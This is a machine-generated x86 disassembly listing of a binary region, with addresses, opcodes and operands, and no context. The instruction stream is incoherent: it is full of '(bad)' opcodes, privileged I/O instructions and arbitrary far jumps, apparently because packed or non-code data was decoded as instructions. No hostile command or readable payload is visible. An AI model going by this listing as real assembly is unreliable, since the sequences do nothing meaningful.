  42a1ca:	push   esi
  42a1cb:	add    BYTE PTR [esi],0x21
  42a1ce:	out    dx,eax
  42a1cf:	sbb    BYTE PTR [esi],ah
  42a1d1:	ja     0x42a1c3
  42a1d3:	jb     0x42a1ac
  42a1d5:	mov    ch,0xb0
  42a1d7:	xchg   bh,dh
  42a1d9:	(bad)  
  42a1da:	jmp    0x58d9:0xe14d9487
  42a1e1:	push   0xfdc20192
  42a1e6:	not    BYTE PTR [esi+0x3490edf5]
  42a1ec:	cmp    DWORD PTR [ecx],edx
  42a1ee:	sub    DWORD PTR [esi],esp
  42a1f0:	shl    BYTE PTR [esp+eax*8+0x5f5c833e],0xa4
  42a1f8:	push   es
  42a1f9:	test   DWORD PTR [esi],0x17eec12f
  42a1ff:	hlt    
  42a200:	adc    BYTE PTR [eax+0x25f04f92],cl
  42a206:	add    eax,0x8f3f8f5a
  42a20b:	test   al,0x56
  42a20d:	push   ss
  42a20e:	in     eax,dx
  42a20f:	and    al,BYTE PTR [eax]
	...
  42a271:	add    BYTE PTR [eax],al
  42a273:	add    BYTE PTR [ebx],ch
  42a275:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a27b:	mov    bh,0x1a
  42a27d:	aas    
  42a27e:	scas   al,BYTE PTR es:[edi]
  42a27f:	fnstenv [ecx+ebp*2-0x1d]
  42a283:	jne    0x42a215
  42a285:	ret    0x1
  42a288:	add    al,0x1
  42a28a:	add    BYTE PTR [eax],al
  42a28c:	xor    ebx,DWORD PTR cs:[ecx+eax*1]
  42a290:	sar    DWORD PTR [esi+0x30728af0],cl
  42a296:	pop    ss
  42a297:	nop
  42a298:	fild   DWORD PTR [ecx-0x296e0022]
  42a29e:	and    ebx,DWORD PTR [ebx+0x7824f2ee]
  42a2a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a2a5:	inc    edi
  42a2a6:	push   esp
  42a2a7:	add    DWORD PTR [eax+0x8],ebx
  42a2aa:	jg     0x42a2e6
  42a2ac:	ja     0x42a2a2
  42a2ae:	out    dx,eax
  42a2af:	fisubr WORD PTR [edi-0x2977be55]
  42a2b5:	lea    edi,[ecx-0x68a89d8c]
  42a2bb:	sti    
  42a2bc:	inc    edx
  42a2bd:	sbb    eax,0x5d699aed
  42a2c2:	leave  
  42a2c3:	aad    0xb6
  42a2c5:	repnz fdivr st,st(6)
  42a2c8:	cmp    eax,0x5d26006b
  42a2cd:	jecxz  0x42a303
  42a2cf:	cmp    ecx,DWORD PTR [esi-0x70]
  42a2d2:	sub    ebp,edi
  42a2d4:	mov    dl,0xc0
  42a2d6:	adc    eax,0xd274c612
  42a2db:	jecxz  0x42a339
  42a2dd:	xchg   DWORD PTR [edx+0x118f3ce5],esp
  42a2e3:	stos   BYTE PTR es:[edi],al
  42a2e4:	push   ecx
  42a2e5:	in     al,dx
  42a2e6:	inc    eax
  42a2e7:	test   eax,edi
  42a2e9:	pop    ebx
  42a2ea:	jg     0x42a303
  42a2ec:	imul   ebx,DWORD PTR [ebx],0xa82afa88
  42a2f2:	dec    edx
  42a2f3:	loop   0x42a2a4
  42a2f5:	adc    DWORD PTR [edx+0xeae634c],edx
  42a2fb:	mov    cl,dh
  42a2fd:	jo     0x42a334
  42a2ff:	sbb    al,0x9c
  42a301:	jmp    0x8ff8:0xd328304d
  42a308:	imul   ecx,DWORD PTR [ecx+0x68],0xa
  42a30c:	xor    ecx,edx
  42a30e:	(bad)  
  42a30f:	stc    
  42a310:	push   ss
  42a311:	aaa    
  42a312:	pop    edx
  42a313:	pop    ebx
  42a314:	fidiv  DWORD PTR [ecx+0x24512118]
  42a31a:	push   cs
  42a31b:	out    dx,eax
  42a31c:	xor    dl,cl
  42a31e:	xchg   edi,eax
  42a31f:	call   0xe319:0x158153a6
  42a326:	add    al,0xd3
  42a328:	(bad)  
  42a329:	loope  0x42a2eb
  42a32b:	cmp    al,0xd0
  42a32d:	pop    ds
  42a32e:	test   BYTE PTR ds:0xf1fe4378,dl
  42a334:	or     bh,ah
  42a336:	test   BYTE PTR [ecx-0x56],0x9
  42a33a:	test   DWORD PTR [ecx-0x7],esi
  42a33d:	dec    ebx
  42a33e:	div    DWORD PTR [edx+0x3a96d78e]
  42a344:	test   DWORD PTR [eax+eax*4],0x3cd5f0eb
  42a34b:	imul   BYTE PTR gs:[ebx-0x3f8983c1]
  42a352:	lahf   
  42a353:	cdq    
  42a354:	repnz enter 0x1077,0xcb
  42a359:	or     eax,0x24721e1
  42a35e:	jmp    0x42a37b
  42a360:	inc    ecx
  42a361:	enter  0x6359,0xfe
  42a365:	and    al,0xf2
  42a367:	fisubr DWORD PTR [ebx-0x201c385e]
  42a36d:	pop    edi
  42a36e:	jno    0x42a3d1
  42a370:	mov    WORD PTR [ecx+eiz*2-0x5b25c8f7],es
  42a377:	imul   ecx,DWORD PTR [edi+0x5d],0x50fd36d2
  42a37e:	iret   
  42a37f:	push   esi
  42a380:	(bad)
  42a384:	popa   
  42a385:	fbstp  TBYTE PTR [esi]
  42a387:	cli    
  42a388:	ss lahf 
  42a38a:	stos   DWORD PTR es:[edi],eax
  42a38b:	mov    eax,ds:0x9c861c59
	...
  42a3f4:	jg     0x42a404
  42a3f6:	jne    0x42a433
  42a3f8:	jne    0x42a475
  42a3fa:	jg     0x42a44a
  42a3fc:	loop   0x42a467
  42a3fe:	mov    ebp,0xc34bf3d
  42a403:	mov    ecx,0x1c394
  42a408:	add    al,0x1
  42a40a:	add    BYTE PTR [eax],al
  42a40c:	xor    BYTE PTR [edx+0x64],0xd5
  42a410:	pop    edi
  42a411:	(bad)  
  42a412:	fwait
  42a413:	repnz das 
  42a415:	or     eax,DWORD PTR [ecx]
  42a417:	adc    dh,dl
  42a419:	pop    eax
  42a41a:	jl     0x42a3b2
  42a41c:	add    al,0x72
  42a41e:	sar    BYTE PTR [ecx+0x6f],cl
  42a421:	lea    ebx,[edi]
  42a423:	jl     0x42a3cf
  42a425:	ja     0x42a403
  42a427:	jmp    0xb7827ab8
  42a42c:	loop   0x42a3e1
  42a42e:	nop
  42a42f:	pop    ecx
  42a430:	imul   BYTE PTR [ecx]
  42a432:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a433:	mov    WORD PTR [eax+0x1c86d2ef],?
  42a439:	cmp    BYTE PTR [esi+0x78],0x43
  42a43d:	int3   
  42a43e:	and    ah,bl
  42a440:	sub    eax,0xf42fc5fb
  42a445:	cs loop 0x42a3ce
  42a448:	pop    ds
  42a449:	inc    esp
  42a44a:	fnstsw WORD PTR [eax+0x43]
  42a44d:	jo     0x42a44f
  42a44f:	fidiv  DWORD PTR [esi-0x6b]
  42a452:	mov    ds:0xf03bc81e,al
  42a457:	mov    esp,0xb32aba5
  42a45c:	xor    ecx,DWORD PTR [ebp+0x0]
  42a45f:	fstp   TBYTE PTR [edi-0x3e]
  42a462:	mov    bl,0xc9
  42a464:	push   edx
  42a465:	inc    ebx
  42a466:	sub    eax,DWORD PTR [esi]
  42a468:	aaa    
  42a469:	int    0x2b
  42a46b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a46c:	jae    0x42a483
  42a46e:	xor    ah,BYTE PTR [eax-0x293717eb]
  42a474:	inc    ebp
  42a475:	ret    0x6cff
  42a478:	jb     0x42a43f
  42a47a:	hlt    
  42a47b:	sbb    edi,edi
  42a47d:	mov    al,ds:0x5674a5a0
  42a482:	fild   WORD PTR [ecx]
  42a484:	fimul  DWORD PTR [edx]
  42a486:	push   edx
  42a487:	pop    ss
  42a488:	pop    eax
  42a489:	in     eax,dx
  42a48a:	stc    
  42a48b:	mov    edi,0x2840ed0c
  42a490:	dec    eax
  42a491:	or     eax,0xf51c5f50
  42a496:	into   
  42a497:	es cwde 
  42a499:	dec    edi
  42a49a:	rcl    DWORD PTR [esp+ecx*1],cl
  42a49d:	jle    0x42a50f
  42a49f:	sbb    esp,ecx
  42a4a1:	jge    0x42a4b4
  42a4a3:	aas    
  42a4a4:	rol    DWORD PTR [edx-0x1046d12f],cl
  42a4aa:	out    0xf3,eax
  42a4ac:	pop    ebx
  42a4ad:	or     esp,esi
  42a4af:	push   edx
  42a4b0:	dec    edi
  42a4b1:	xor    WORD PTR [ecx+edx*2],ax
  42a4b5:	cmp    dh,BYTE PTR [eax+0x25]
  42a4b8:	cmp    edx,DWORD PTR [edi]
  42a4ba:	into   
  42a4bb:	lds    edx,FWORD PTR [ebp+0x163896]
  42a4c1:	aas    
  42a4c2:	lock push esp
  42a4c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a4c5:	mov    esi,0xea4de4f6
  42a4ca:	mov    ebx,0x8ed36dc
  42a4cf:	sub    ah,al
  42a4d1:	std    
  42a4d2:	mov    eax,0x56ab9b2f
  42a4d7:	adc    al,0x64
  42a4d9:	inc    ebp
  42a4da:	or     eax,0x6d6edb6c
  42a4df:	xchg   ecx,eax
  42a4e0:	mov    DWORD PTR [ebp-0x73],eax
  42a4e3:	dec    ecx
  42a4e4:	and    BYTE PTR [ebp-0x246d10b4],cl
  42a4ea:	test   al,0xbd
  42a4ec:	mov    esi,0xf0d5c29
  42a4f1:	mov    cl,0x91
  42a4f3:	mov    ecx,0xbf355c4b
  42a4f8:	sti    
  42a4f9:	in     al,0x1e
  42a4fb:	ins    DWORD PTR es:[edi],dx
  42a4fc:	adc    DWORD PTR [ecx+0x33],edx
  42a4ff:	ins    BYTE PTR es:[edi],dx
  42a500:	or     esi,DWORD PTR [ecx]
  42a502:	pop    es
  42a503:	and    ah,BYTE PTR [ebp-0x4b]
  42a506:	mov    bh,0xd5
  42a508:	test   BYTE PTR [ebx+edx*1],0x18
  42a50c:	push   ebp
  42a50d:	push   ebx
  42a50e:	adc    al,0x87
	...
  42a574:	sbb    BYTE PTR [edi+0x17],cl
  42a577:	mov    ecx,0xefbef957
  42a57c:	(bad)  
  42a57d:	cmc    
  42a57e:	mov    edx,0x787bec9f
  42a583:	(bad)  
  42a584:	cwde   
  42a585:	les    eax,FWORD PTR [ecx]
  42a587:	add    BYTE PTR [ecx+eax*1],al
  42a58a:	add    BYTE PTR [eax],al
  42a58c:	(bad)
  42a591:	pop    ecx
  42a592:	jno    0x42a536
  42a594:	retf   0x4875
  42a597:	repnz fwait
  42a599:	push   0x7d
  42a59b:	mov    ds:0x827611a5,eax
  42a5a0:	xchg   edx,eax
  42a5a1:	mov    edx,0xc98edf7c
  42a5a6:	int3   
  42a5a7:	dec    edx
  42a5a8:	sar    DWORD PTR [esi+0x42fa1342],1
  42a5ae:	jns    0x42a569
  42a5b0:	dec    esi
  42a5b1:	dec    ebp
  42a5b2:	xchg   ebx,eax
  42a5b3:	xchg   ebp,eax
  42a5b4:	pop    ds
  42a5b5:	loope  0x42a58c
  42a5b7:	push   ecx
  42a5b8:	xchg   DWORD PTR [edi+edi*2],ebp
  42a5bb:	pop    ss
  42a5bc:	imul   BYTE PTR [edx]
  42a5be:	mov    ch,0x92
  42a5c0:	aas    
  42a5c1:	(bad)  
  42a5c2:	rcr    DWORD PTR [ebx],cl
  42a5c4:	jle    0x42a617
  42a5c6:	ret    0x1ea2
  42a5c9:	and    al,0x20
  42a5cb:	xchg   edi,eax
  42a5cc:	or     DWORD PTR [ecx],edx
  42a5ce:	out    dx,eax
  42a5cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a5d0:	test   ah,ch
  42a5d2:	(bad)  
  42a5d3:	pop    ds
  42a5d4:	aaa    
  42a5d5:	(bad)  
  42a5d6:	push   ds
  42a5d7:	sub    ah,0xae
  42a5da:	aas    
  42a5db:	int    0x9d
  42a5dd:	push   0x68
  42a5df:	mov    ebx,0x550d006e
  42a5e4:	pushf  
  42a5e5:	add    cl,BYTE PTR [edx+eax*2-0x72]
  42a5e9:	mov    eax,DWORD PTR [edi+0x74633510]
  42a5ef:	mul    BYTE PTR [edx+0xc]
  42a5f2:	push   edi
  42a5f3:	mov    dl,BYTE PTR [edi+0x22]
  42a5f6:	xchg   edi,eax
  42a5f7:	pop    edi
  42a5f8:	add    eax,0x40e3f524
  42a5fd:	inc    ecx
  42a5fe:	xor    ebx,DWORD PTR [eax]
  42a600:	popf   
  42a601:	or     eax,0x342b4240
  42a606:	mov    ebp,esp
  42a608:	mov    esi,0xf33d36dc
  42a60d:	jne    0x42a5f5
  42a60f:	mov    dh,0xd8
  42a611:	lods   eax,DWORD PTR ds:[esi]
  42a612:	mov    al,0xca
  42a614:	test   BYTE PTR [edi],ch
  42a616:	daa    
  42a617:	aas    
  42a618:	xchg   BYTE PTR [esi],dl
  42a61a:	pop    ecx
  42a61b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a61c:	and    dh,bl
  42a61e:	aaa    
  42a61f:	rcl    BYTE PTR [edi+0x862a7ec],1
  42a625:	(bad)  [eax+ebp*1]
  42a628:	mov    ds:0x28f53328,eax
  42a62d:	jnp    0x42a62c
  42a62f:	cmp    ebp,0x6f
  42a632:	jg     0x42a5d4
  42a634:	loopne 0x42a68e
  42a636:	xchg   DWORD PTR [eax-0x30],edx
  42a639:	sbb    BYTE PTR [esp+edi*1],dh
  42a63c:	pop    ss
  42a63d:	mov    eax,0x4b43a3c
  42a642:	jg     0x42a5f1
  42a644:	test   DWORD PTR [ebx-0x74],eax
  42a647:	ins    DWORD PTR es:[edi],dx
  42a648:	or     al,0xb1
  42a64a:	and    dl,ah
  42a64c:	inc    ebp
  42a64d:	cmp    al,0xfe
  42a64f:	cmp    al,0x51
  42a651:	inc    eax
  42a652:	push   0x5c3cb767
  42a657:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a658:	pop    edi
  42a659:	ins    DWORD PTR es:[edi],dx
  42a65a:	cmp    BYTE PTR [ebp+0x4],ch
  42a65d:	icebp  
  42a65e:	cld    
  42a65f:	mov    cl,0xec
  42a661:	sbb    dl,BYTE PTR [edi]
  42a663:	inc    edx
  42a664:	mov    edx,0x5df03dcd
  42a669:	push   es
  42a66a:	hlt    
  42a66b:	inc    esp
  42a66c:	jnp    0x42a6c6
  42a66e:	mov    dh,0xd3
  42a670:	and    eax,edi
  42a672:	pop    ebx
  42a673:	inc    edx
  42a674:	or     eax,0x5bccda52
  42a679:	mov    bh,0x3b
  42a67b:	and    dh,BYTE PTR [ecx-0x79b38ec5]
  42a681:	nop
  42a682:	jecxz  0x42a68f
  42a684:	cmp    esp,DWORD PTR [ecx+edi*1]
  42a687:	push   0x40373640
  42a68c:	push   ecx
  42a68d:	jne    0x42a61d
  42a68f:	inc    ecx
	...
  42a6f4:	and    al,0x16
  42a6f6:	outs   dx,BYTE PTR ds:[esi]
  42a6f7:	(bad)  
  42a6f8:	jle    0x42a6f9
  42a6fa:	lods   eax,DWORD PTR ds:[esi]
  42a6fb:	test   DWORD PTR [edi-0x2e47ece4],0x9cbd2648
  42a705:	lds    eax,FWORD PTR [ecx]
  42a707:	add    BYTE PTR [ecx+eax*1],al
  42a70a:	add    BYTE PTR [eax],al
  42a70c:	retf   0x8985
  42a70f:	xor    ebp,DWORD PTR [ecx+0x3f54a43a]
  42a715:	pop    ss
  42a716:	sbb    eax,0x3d0501da
  42a71b:	jle    0x42a798
  42a71d:	out    0x91,eax
  42a71f:	pop    edx
  42a720:	dec    ebx
  42a721:	pop    ss
  42a722:	aam    0x33
  42a724:	xor    eax,0xf21f7ba8
  42a729:	xchg   esp,eax
  42a72a:	and    BYTE PTR [eax-0x12],ah
  42a72d:	shl    BYTE PTR [edx-0xbde6e7a],1
  42a733:	lods   al,BYTE PTR ds:[esi]
  42a734:	in     al,dx
  42a735:	mov    ebp,gs
  42a737:	lahf   
  42a738:	inc    edx
  42a739:	xchg   edi,eax
  42a73a:	xchg   ebx,eax
  42a73b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a73c:	cmp    eax,0x477fab7f
  42a741:	mov    edi,0x1a2790e7
  42a746:	or     ebp,DWORD PTR [eax+0x649da744]
  42a74c:	sti    
  42a74d:	jl     0x42a6d3
  42a74f:	xor    ecx,DWORD PTR [ecx-0x33]
  42a752:	jns    0x42a7b8
  42a754:	in     al,dx
  42a755:	call   0x21336acb
  42a75a:	dec    edx
  42a75b:	xchg   DWORD PTR [ebx],eax
  42a75d:	out    0x18,al
  42a75f:	(bad)  
  42a760:	aam    0xfd
  42a762:	enter  0x4e83,0x2
  42a766:	aaa    
  42a767:	push   cs
  42a768:	sub    al,0x98
  42a76b:	and    BYTE PTR [ebx+ebx*1],dl
  42a76e:	or     bh,BYTE PTR [eax-0x7d5bbba6]
  42a774:	aam    0x7b
  42a776:	ficomp WORD PTR [ebx-0x10]
  42a779:	mov    ebp,0xe59ba645
  42a77e:	fwait
  42a77f:	fwait
  42a780:	aad    0xf3
  42a782:	push   esi
  42a783:	mov    DWORD PTR [ecx-0x11],edi
  42a786:	and    al,0x2c
  42a788:	stos   DWORD PTR es:[edi],eax
  42a789:	mov    edi,0x7fa8557e
  42a78e:	mov    eax,0xb6f59572
  42a793:	inc    ecx
  42a794:	idiv   BYTE PTR [edi+0x23428092]
  42a79a:	sbb    bh,BYTE PTR [edi-0x1b296f1c]
  42a7a0:	dec    dx
  42a7a2:	cli    
  42a7a3:	jge    0x42a80c
  42a7a5:	jae    0x42a735
  42a7a7:	push   ebx
  42a7a8:	pop    ebx
  42a7a9:	daa    
  42a7aa:	ret    
  42a7ab:	jnp    0x42a7e6
  42a7ad:	mov    ecx,0x4d552891
  42a7b2:	push   ss
  42a7b3:	xchg   DWORD PTR [eax+ebp*8-0xe98a2b5],esi
  42a7ba:	sahf   
  42a7bb:	jge    0x42a74f
  42a7bd:	leave  
  42a7be:	add    eax,0x1945f0a0
  42a7c3:	enter  0x11ee,0xba
  42a7c7:	call   0x98c1:0xe79e28b
  42a7ce:	pop    es
  42a7cf:	xor    DWORD PTR [esp+ecx*2-0x5a],0xa3e413c5
  42a7d7:	out    dx,al
  42a7d8:	out    dx,eax
  42a7d9:	dec    esi
  42a7da:	add    al,0x64
  42a7dc:	stc    
  42a7dd:	mov    edx,0x6167e1f9
  42a7e2:	sahf   
  42a7e3:	or     al,0x92
  42a7e5:	and    al,0x8d
  42a7e7:	pop    edi
  42a7e8:	jbe    0x42a83b
  42a7ea:	sbb    DWORD PTR [edi-0x3b],eax
  42a7ed:	pop    edx
  42a7ee:	jmp    0x42a851
  42a7f0:	mov    eax,0x6eda139e
  42a7f5:	stos   BYTE PTR es:[edi],al
  42a7f6:	sub    al,0x9
  42a7f8:	adc    DWORD PTR [eax+eiz*1+0x7d],edi
  42a7fc:	dec    edx
  42a7fd:	lds    eax,FWORD PTR [ecx+edi*8-0x47]
  42a801:	xor    esp,esp
  42a803:	push   edx
  42a804:	daa    
  42a805:	jo     0x42a7b3
  42a807:	scas   al,BYTE PTR es:[edi]
  42a808:	fisubr DWORD PTR [eax+0x74e8a478]
  42a80e:	mov    ch,0x46
	...
  42a874:	mov    ah,BYTE PTR [ebp+0x63]
  42a877:	mov    edi,0x75debfef
  42a87c:	add    ebp,0x6f386c97
  42a882:	ficom  DWORD PTR [ecx]
  42a884:	mov    al,ds:0x40001c6
  42a889:	add    DWORD PTR [eax],eax
  42a88b:	add    BYTE PTR [edi-0x52],dl
  42a88e:	jp     0x42a832
  42a890:	add    ch,bh
  42a892:	imul   esp,DWORD PTR [edx],0x69cb904b
  42a898:	into   
  42a899:	cmp    BYTE PTR ss:[ebp-0x1b],dh
  42a89d:	gs mov edi,0xd8cdd620
  42a8a3:	dec    esp
  42a8a4:	mov    bl,0x84
  42a8a6:	cmp    esi,DWORD PTR [eax+0x5d]
  42a8a9:	inc    bp
  42a8ab:	fcomp  QWORD PTR [edx]
  42a8ad:	in     al,0xbe
  42a8af:	enter  0x6255,0x62
  42a8b3:	jp     0x42a8cd
  42a8b5:	push   ebp
  42a8b6:	inc    edx
  42a8b7:	in     al,0xa9
  42a8b9:	sysret 
  42a8bb:	dec    edi
  42a8bc:	repz adc al,0xf0
  42a8bf:	(bad)  
  42a8c0:	mov    edx,0x8b196a10
  42a8c5:	ret    0xd49f
  42a8c8:	fwait
  42a8c9:	out    dx,eax
  42a8ca:	pop    esp
  42a8cb:	mul    BYTE PTR [ebx+0x6a]
  42a8ce:	push   esp
  42a8cf:	or     esp,DWORD PTR [eax]
  42a8d1:	pusha  
  42a8d2:	int3   
  42a8d3:	xchg   edx,eax
  42a8d4:	jle    0x42a8c8
  42a8d6:	das    
  42a8d7:	ins    BYTE PTR es:[edi],dx
  42a8d8:	jne    0x42a85e
  42a8da:	sbb    ebx,ebx
  42a8dc:	pop    ss
  42a8dd:	adc    BYTE PTR [eax],dl
  42a8df:	jp     0x42a891
  42a8e1:	push   ds
  42a8e2:	sub    cl,al
  42a8e4:	vprotw xmm9,xmm1,0x49
  42a8e9:	std    
  42a8ea:	sbb    BYTE PTR [ebx+0x14],ch
  42a8ed:	push   edx
  42a8ee:	test   al,0x19
  42a8f0:	pusha  
  42a8f1:	leave  
  42a8f2:	mov    edx,0x4bc7e79
  42a8f7:	xchg   esp,eax
  42a8f8:	mov    bh,0x99
  42a8fa:	cs cdq 
  42a8fc:	or     ecx,edx
  42a8fe:	out    0x92,eax
  42a900:	fist   DWORD PTR [edx]
  42a902:	pop    es
  42a903:	adc    BYTE PTR [edx*4+0x35c5471],ch
  42a90a:	jl     0x42a961
  42a90c:	scas   al,BYTE PTR es:[edi]
  42a90d:	loope  0x42a8c9
  42a90f:	imul   al
  42a911:	mov    dl,0x23
  42a913:	dec    edx
  42a914:	or     BYTE PTR [eax],bh
  42a916:	ja     0x42a945
  42a918:	sub    eax,0x1cd3e93c
  42a91d:	jp     0x42a911
  42a91f:	lods   ax,WORD PTR ds:[esi]
  42a921:	(bad)  
  42a922:	xchg   ecx,eax
  42a923:	cld    
  42a924:	ins    DWORD PTR es:[edi],dx
  42a925:	shl    BYTE PTR [edx+0x4d],1
  42a928:	sbb    esi,ebx
  42a92a:	or     edi,DWORD PTR [edi-0x51]
  42a92d:	push   ebx
  42a92e:	addr16 sbb al,0x38
  42a931:	repnz dec esp
  42a933:	sbb    eax,0x1c8beb01
  42a938:	fsubr  st(5),st
  42a93a:	pop    esp
  42a93b:	stc    
  42a93c:	ror    BYTE PTR [ebp+0x6e],1
  42a93f:	in     eax,dx
  42a940:	mov    ds:0x840ff6ae,al
  42a945:	fist   WORD PTR [edx]
  42a947:	repnz fsubr QWORD PTR ds:0x2f76a515
  42a94e:	adc    eax,0xf7406461
  42a953:	sub    al,0x9a
  42a955:	lock imul edx,esi,0xffffffbc
  42a959:	mov    gs,WORD PTR ds:0xe2160596
  42a95f:	lods   eax,DWORD PTR ds:[esi]
  42a960:	mov    al,ds:0x96cbd72
  42a965:	cld    
  42a966:	mov    bh,0xdd
  42a968:	or     eax,0x44d72366
  42a96d:	outs   dx,DWORD PTR ds:[esi]
  42a96e:	pushf  
  42a96f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a970:	cmc    
  42a971:	test   eax,0x5e4a3a5d
  42a976:	mov    ecx,0x20b81c16
  42a97b:	xchg   ebp,eax
  42a97c:	mov    edi,0x94771cad
  42a981:	sub    DWORD PTR [ebx+edx*8+0x73a23b05],eax
  42a988:	and    DWORD PTR [esi],0x38ef77e9
  42a98e:	inc    ebx
  42a98f:	mov    esi,0x0
	...
  42a9f4:	test   al,0x93
  42a9f6:	sbb    eax,0xfbee3fee
  42a9fb:	xlat   BYTE PTR ds:[ebx]
  42a9fc:	in     eax,0xd3
  42a9fe:	aad    0x7
  42aa00:	ret    0xb1b5
  42aa03:	inc    esp
  42aa04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aa05:	mov    DWORD PTR [ecx],0x10400
  42aa0b:	add    BYTE PTR [eax],dh
  42aa0d:	pop    es
  42aa0e:	mov    bh,0x8d
  42aa10:	xor    eax,0x74e76ba8
  42aa15:	pop    ss
  42aa16:	pop    ecx
  42aa17:	cmc    
  42aa18:	or     al,0x8
  42aa1a:	ficomp DWORD PTR [edi-0x1e]
  42aa1d:	inc    ebx
  42aa1e:	xchg   ecx,eax
  42aa1f:	stc    
  42aa20:	in     eax,0x8d
  42aa22:	or     BYTE PTR [ecx],ch
  42aa24:	int    0x14
  42aa26:	lahf   
  42aa27:	cdq    
  42aa28:	repnz imul eax,DWORD PTR [ebp-0x79b6c8ae],0x26
  42aa30:	pop    esi
  42aa31:	pop    ebx
  42aa32:	mov    ss,esi
  42aa34:	push   0x1bbbb889
  42aa39:	(bad)  
  42aa3a:	aam    0xee
  42aa3c:	xor    DWORD PTR [ebx],ebp
  42aa3e:	cmc    
  42aa3f:	and    bh,BYTE PTR [esi+0x32]
  42aa42:	sbb    bl,BYTE PTR [edx-0x14250e7b]
  42aa48:	push   esp
  42aa49:	dec    esp
  42aa4a:	jl     0x42aa2a
  42aa4c:	mov    esi,ebp
  42aa4e:	cmp    DWORD PTR [ebp+ebx*4-0x6],ebx
  42aa52:	fxch   st(4)
  42aa54:	outs   dx,BYTE PTR ds:[esi]
  42aa55:	imul   ecx,DWORD PTR [ebp-0x6f],0x4ef04229
  42aa5c:	xor    eax,0xb84130a
  42aa61:	int3   
  42aa62:	inc    ecx
  42aa63:	mov    bh,0x8a
  42aa65:	inc    ebp
  42aa66:	add    al,BYTE PTR [ecx+0x1f75d1f7]
  42aa6c:	xchg   ecx,eax
  42aa6d:	pop    ecx
  42aa6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aa6f:	pop    ecx
  42aa70:	jmp    0x36e:0xf515a932
  42aa77:	(bad)  
  42aa78:	in     eax,0xfb
  42aa7a:	hlt    
  42aa7b:	int    0x81
  42aa7d:	mov    esi,0x4764717e
  42aa82:	in     eax,0x4a
  42aa84:	cmc    
  42aa85:	and    ecx,DWORD PTR [edi]
  42aa87:	xor    bh,cl
  42aa89:	loope  0x42aa53
  42aa8b:	adc    BYTE PTR [edi],bh
  42aa8d:	and    ah,BYTE PTR [eax+0x18f51ab]
  42aa93:	sti    
  42aa94:	xor    bl,BYTE PTR [edx]
  42aa96:	pop    ebx
  42aa97:	mov    al,0x81
  42aa99:	das    
  42aa9a:	ds add al,0xb9
  42aa9d:	lock push edx
  42aa9f:	or     dh,0xd
  42aaa2:	cmp    BYTE PTR es:[ecx-0x68],bl
  42aaa6:	int    0x3f
  42aaa8:	pop    edx
  42aaa9:	push   ebp
  42aaaa:	sbb    al,0x29
  42aaac:	scas   eax,DWORD PTR es:[edi]
  42aaad:	sbb    BYTE PTR [eax-0x5f],bl
  42aab0:	ror    edi,cl
  42aab2:	jl     0x42aa5a
  42aab4:	mov    ds:0x633512ee,eax
  42aab9:	retf   
  42aaba:	mov    cl,0xa8
  42aabc:	jno    0x42aadf
  42aabe:	loope  0x42aa8b
  42aac0:	aam    0x30
  42aac2:	adc    esp,DWORD PTR [edi]
  42aac4:	mov    eax,0xeee8edf7
  42aac9:	push   ebp
  42aaca:	xchg   esp,eax
  42aacb:	je     0x42ab19
  42aacd:	push   0xc1b62b5e
  42aad2:	leave  
  42aad3:	cld    
  42aad4:	nop
  42aad5:	xchg   edx,esi
  42aad7:	scas   al,BYTE PTR es:[edi]
  42aad8:	push   ebp
  42aad9:	adc    BYTE PTR ds:0x56987f9f,0xc5
  42aae0:	jo     0x42aa76
  42aae2:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aae4:	add    esp,ebx
  42aae6:	pop    esp
  42aae7:	outs   dx,DWORD PTR ds:[esi]
  42aae8:	sbb    eax,0xb3c5af84
  42aaed:	in     eax,dx
  42aaee:	push   ecx
  42aaef:	jle    0x42ab33
  42aaf1:	or     DWORD PTR [esi],esp
  42aaf3:	jmp    0xafc1:0x485ebbb5
  42aafa:	xlat   BYTE PTR ds:[ebx]
  42aafb:	sbb    eax,0x132cceb0
  42ab00:	hlt    
  42ab01:	outs   dx,BYTE PTR ds:[esi]
  42ab02:	fmul   QWORD PTR [bp+si+0x68]
  42ab06:	jg     0x42aaaf
  42ab08:	aaa    
  42ab09:	or     edi,DWORD PTR [ebp-0x78bfd596]
  42ab0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  42ab74:	ds push cs
  42ab76:	sub    al,0x5d
  42ab78:	cmp    al,0x7f
  42ab7a:	jg     0x42abeb
  42ab7c:	and    BYTE PTR [eax],cl
  42ab7e:	mov    dl,0x43
  42ab80:	pop    ecx
  42ab81:	fcom   DWORD PTR [edi+0x1c8a8bb]
  42ab87:	add    BYTE PTR [ecx+eax*1],al
  42ab8a:	add    BYTE PTR [eax],al
  42ab8c:	lds    ecx,FWORD PTR [ebx+0x20]
  42ab8f:	sti    
  42ab90:	int    0x52
  42ab92:	xor    cl,dh
  42ab94:	and    BYTE PTR [edi],al
  42ab96:	pop    edi
  42ab97:	push   ss
  42ab98:	cli    
  42ab99:	cmp    esp,ebx
  42ab9b:	jl     0x42ab46
  42ab9d:	jo     0x42ab1f
  42ab9f:	push   es
  42aba0:	loop   0x42ab56
  42aba2:	test   BYTE PTR [ebx+0x28],dl
  42aba5:	sti    
  42aba6:	mov    ebp,0xedb09efa
  42abab:	cmp    BYTE PTR [eax-0x685c48f4],cl
  42abb1:	das    
  42abb2:	adc    eax,0xf98d9a7d
  42abb7:	jbe    0x42abf4
  42abb9:	mov    ah,BYTE PTR [ebx-0x2b]
  42abbc:	(bad)  
  42abbd:	cli    
  42abbe:	mov    al,0x65
  42abc0:	fstp   DWORD PTR [eax]
  42abc2:	in     eax,0x6a
  42abc4:	cmp    eax,DWORD PTR [edi+0x57fdd437]
  42abca:	pop    es
  42abcb:	in     al,0x42
  42abcd:	mov    ds:0xdce7aa36,al
  42abd2:	retf   
